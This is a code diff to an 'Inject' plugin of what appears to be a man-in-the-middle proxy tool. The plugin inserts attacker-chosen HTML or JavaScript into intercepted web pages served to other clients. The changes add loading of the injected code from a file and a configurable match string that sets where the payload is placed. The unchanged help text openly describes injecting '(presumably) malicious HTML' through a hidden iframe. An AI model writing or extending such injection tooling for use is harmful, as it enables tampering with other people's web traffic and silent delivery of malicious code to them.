@@ -1,4 +1,5 @@
 import os,subprocess,logging,time,re
+import argparse
 from plugins.plugin import Plugin
 
 class Inject(Plugin):
@@ -16,7 +17,11 @@ class Inject(Plugin):
         self.rate_limit = options.rate_limit
         self.count_limit = options.count_limit
         self.per_domain = options.per_domain
+        self.match_str = options.match_str
         self.html_payload = options.html_payload
+        if options.html_file != None:
+            self.html_payload += options.html_file.read()
+
         self.ctable = {}
         self.dtable = {}
         self.count = 0
@@ -30,7 +35,7 @@ class Inject(Plugin):
         if self._should_inject(ip,hn,mime) and \
             (not self.js_src==self.html_src==None or not self.html_payload==""):
 
-            data = self._insert_html(data,post=[("</body>",self._get_payload())])
+            data = self._insert_html(data,post=[(self.match_str,self._get_payload())])
             self.ctable[ip] = time.time()
             self.dtable[ip+hn] = True
             self.count+=1
@@ -46,7 +51,11 @@ class Inject(Plugin):
         options.add_argument("--html-url",type=str,
                 help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
         options.add_argument("--html-payload",type=str,default="",
-                help="Arbitrary HTML you would like to inject at end of file.")
+                help="String you would like to inject.")
+        options.add_argument("--html-file",type=argparse.FileType('r'),default=None,
+                help="File containing code you would like to inject.")
+        options.add_argument("--match-str",type=str,default="</body>",
+                help="String you would like to match and place your payload before. (</body> by default)")
         options.add_argument("--per-domain",action="store_true",
                 help="Inject once per domain per client.")
         options.add_argument("--rate-limit",type=float,
